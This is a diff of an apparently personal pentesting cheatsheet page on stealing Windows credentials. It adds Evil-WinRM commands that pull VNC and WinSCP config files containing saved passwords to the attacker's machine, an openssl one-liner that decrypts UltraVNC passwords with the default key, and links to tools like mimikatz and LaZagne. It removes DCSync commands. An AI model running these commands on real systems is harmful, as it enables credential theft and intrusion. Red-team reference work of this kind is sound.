@@ -4,22 +4,27 @@ title: TA0006 Credentials Access - Windows
 parent: Pentesting
 category: Pentesting
 grand_parent: Cheatsheets
-modified_date: 2022-09-07
+modified_date: 2023-01-16
 permalink: /:categories/:title/
 ---
 
 <!-- vscode-markdown-toc -->
-* [PRE-REQUISITES](#PRE-REQUISITES)
+* [T1558: Steal and Forge Kerberos Tickets](#T1558:StealandForgeKerberosTickets)
 	* [WHICH OS ? WHAT CREDS ?](#WHICHOSWHATCREDS)
 	* [Rubeus](#Rubeus)
-	* [Other tools](#Othertools)
-* [T1558: Steal and Forge Kerberos Tickets](#T1558:StealandForgeKerberosTickets)
 	* [Kerberos ASKTGT](#KerberosASKTGT)
 	* [Import / Export Tickets](#ImportExportTickets)
-* [DCSync attack](#DCSyncattack)
-* [NTDS.dit dump](#NTDS.ditdump)
 * [LSASS.exe dump](#LSASS.exedump)
 * [SAM dump](#SAMdump)
+* [Services](#Services)
+* [Scheduled Tasks](#ScheduledTasks)
+* [Sofwares](#Sofwares)
+	* [Automated](#Automated)
+	* [xVNC](#xVNC)
+	* [WinSCP](#WinSCP)
+	* [Putty](#Putty)
+	* [Web Browsers](#WebBrowsers)
+* [NTDS.dit dump](#NTDS.ditdump)
 
 <!-- vscode-markdown-toc-config
 	numbering=false
@@ -27,7 +32,7 @@ permalink: /:categories/:title/
 	/vscode-markdown-toc-config -->
 <!-- /vscode-markdown-toc -->
 
-## <a name='PRE-REQUISITES'></a>PRE-REQUISITES
+## <a name='T1558:StealandForgeKerberosTickets'></a>T1558: Steal and Forge Kerberos Tickets 
 
 ### <a name='WHICHOSWHATCREDS'></a>WHICH OS ? WHAT CREDS ?
 
@@ -38,26 +43,11 @@ TO READ:
 * [LSA RunAsPPL protection](https://itm4n.github.io/lsass-runasppl/)
 
 ### <a name='Rubeus'></a>Rubeus 
+
+- [Wiki Rubeus](https://github.com/GhostPack/Rubeus)
 ```powershell
 # compilation
 ```
-
-### <a name='Othertools'></a>Other tools
-
-<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
-<script>$(window).load(function() {var repos = ["https://api.github.com/repos/gentilkiwi/mimikatz/","https://api.github.com/repos/skelsec/pypykatz", "https://api.github.com/repos/SecureAuthCorp/impacket", "https://api.github.com/repos/Hackndo/lsassy", "https://api.github.com/repos/deepinstinct/Lsass-Shtinkering","https://api.github.com/repos/D1rkMtr/DumpThatLSASS","https://api.github.com/repos/codewhitesec/HandleKatz","https://api.github.com/repos/Z4kSec/Masky","https://api.github.com/repos/login-securite/DonPAPI","https://api.github.com/repos/Processus-Thief/HEKATOMB","https://api.github.com/repos/AlessandroZ/LaZagne"]; for (rep in repos) {$.ajax({type: "GET", url: repos[rep], dataType: "json", success: function(result) {$("#repo_list").append("<tr><td><a href='" + result.html_url + "' target='_blank'>" + result.name + "</a></td><td>" + result.updated_at + "</td><td>" + result.stargazers_count + "</td><td>" + result.subscribers_count + "</td><td>" + result.language + "</td></tr>"); console.log(result);}});}console.log(result);});</script>
-
-<link href="/sortable.css" rel="stylesheet" />
-<script src="/sortable.js"></script>
-<div id="repos">
-    <table id="repo_list" class="sortable">
-      <tr><th>repo</th><th>last update</th><th>stars</th><th>watch</th><th>language</th></tr>
-    </table>
-</div>
-
-## <a name='T1558:StealandForgeKerberosTickets'></a>T1558: Steal and Forge Kerberos Tickets 
-
-[Wiki Rubeus](https://github.com/GhostPack/Rubeus)
 
 ### <a name='KerberosASKTGT'></a>Kerberos ASKTGT 
 ```powershell
@@ -73,33 +63,86 @@ mimikatz.exe privilege:debug
 kerberos::list /export
 ```
 
-## <a name='DCSyncattack'></a>DCSync attack
-
-- [T1003.006](https://attack.mitre.org/techniques/T1003/006) DCSYNC
-
-```powershell
-# get the account's SID 
-get-netuser $zlat_user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select objectsid
-
-# retrieve *most* users who can perform DC replication for dev.<Domain>.local (i.e. DCsync)
-Get-DomainObjectAcl $zdom_dn -ResolveGUIDs  -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ? {
-    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
-}
-
-# check the ACL permissions
-Get-ObjectAcl -Identity $zdom_dn -DomainController $zdom_dc_fqdn -Domain $zdom_fqdn -ResolveGUIDs | ? {$_.ObjectSID -match "S-1-5-21-xxx"}
-
-# run the DCsync
-mimikatz.exe privilege:debug
-lsadump::dcsync /dc:$zdom_dc /domain:$zdom_fqdn /user:$zlat_user
-```
-
-## <a name='NTDS.ditdump'></a>NTDS.dit dump
-
-
 ## <a name='LSASS.exedump'></a>LSASS.exe dump
 
-- [lsassy](https://github.com/Hackndo/lsassy)
-- [lsass-shtinkering](https://github.com/deepinstinct/Lsass-Shtinkering)
+<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
+<script>$(window).load(function() {var repos = ["https://api.github.com/repos/gentilkiwi/mimikatz/","https://api.github.com/repos/skelsec/pypykatz", "https://api.github.com/repos/SecureAuthCorp/impacket", "https://api.github.com/repos/Hackndo/lsassy", "https://api.github.com/repos/deepinstinct/Lsass-Shtinkering","https://api.github.com/repos/D1rkMtr/DumpThatLSASS","https://api.github.com/repos/codewhitesec/HandleKatz","https://api.github.com/repos/Z4kSec/Masky","https://api.github.com/repos/login-securite/DonPAPI","https://api.github.com/repos/Processus-Thief/HEKATOMB","https://api.github.com/repos/AlessandroZ/LaZagne"]; for (rep in repos) {$.ajax({type: "GET", url: repos[rep], dataType: "json", success: function(result) {$("#repo_list").append("<tr><td><a href='" + result.html_url + "' target='_blank'>" + result.name + "</a></td><td>" + result.updated_at + "</td><td>" + result.stargazers_count + "</td><td>" + result.subscribers_count + "</td><td>" + result.language + "</td></tr>"); console.log(result);}});}console.log(result);});</script>
+
+<link href="/sortable.css" rel="stylesheet" />
+<script src="/sortable.js"></script>
+<div id="repos">
+    <table id="repo_list" class="sortable">
+      <tr><th>repo</th><th>last update</th><th>stars</th><th>watch</th><th>language</th></tr>
+    </table>
+</div>
+
+- [procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)
 
 ## <a name='SAMdump'></a>SAM dump
+
+- [registry & vss](https://nored0x.github.io/red-teaming/Windows-Credentials-SAM-Database-part-1/)
+
+## <a name='Services'></a>Services
+
+## <a name='ScheduledTasks'></a>Scheduled Tasks
+
+## <a name='Sofwares'></a>Sofwares
+
+### <a name='Automated'></a>Automated
+
+<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
+<script>$(window).load(function() {var repos = ["https://github.com/Arvanaghi/SessionGopher", "https://github.com/EncodeGroup/Gopher", "https://api.github.com/repos/login-securite/DonPAPI","https://api.github.com/repos/AlessandroZ/LaZagne"]; for (rep in repos) {$.ajax({type: "GET", url: repos[rep], dataType: "json", success: function(result) {$("#repo_list").append("<tr><td><a href='" + result.html_url + "' target='_blank'>" + result.name + "</a></td><td>" + result.updated_at + "</td><td>" + result.stargazers_count + "</td><td>" + result.subscribers_count + "</td><td>" + result.language + "</td></tr>"); console.log(result);}});}console.log(result);});</script>
+
+<link href="/sortable.css" rel="stylesheet" />
+<script src="/sortable.js"></script>
+<div id="repos">
+    <table id="repo_list" class="sortable">
+      <tr><th>repo</th><th>last update</th><th>stars</th><th>watch</th><th>language</th></tr>
+    </table>
+</div>
+
+### <a name='xVNC'></a>xVNC
+
+* VNC softwares properties:  
+
+| software | registry key | ini file |
+|----------|--------------|--------|
+| RealVNC | HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver | C:\Program Files\RealVNC\ |
+| TightVNC | HKEY_CURRENT_USER\Software\TightVNC\Server | C:\Program Files\TightVNC\ |
+| TigerVNC | HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4 | C:\Program Files\TigerVNC\ |
+| UltraVNC | | C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini |
+
+* Example of download of the ini file:
+```
+Evil-winRM > download "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini" /tmp/ultravnc.ini
+```
+
+* UtltraVNC specificities
+
+passwd - full control password
+passwd2 - read-only password
+```
+# des decryption using the ultravnc default decryption key 'e84ad660c4721ae0' 
+echo -n passwd | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
+
+# test the password / vnc access
+vncsnapshot 1.2.3.4 pwned_desktop_x.png
+```
+
+
+### <a name='WinSCP'></a>WinSCP
+
+* Get an RDP session
+* Check if there are saved passwords
+* Export the configuration
+* Download of the ini file:
+```
+Evil-winRM > download "C:\Windows\Temp\winscp.ini" /tmp/winscp.ini
+```
+
+### <a name='Putty'></a>Putty
+
+### <a name='WebBrowsers'></a>Web Browsers
+- [chrome / mac os](https://github.com/breakpointHQ/chrome-bandit)
+
+## <a name='NTDS.ditdump'></a>NTDS.dit dump
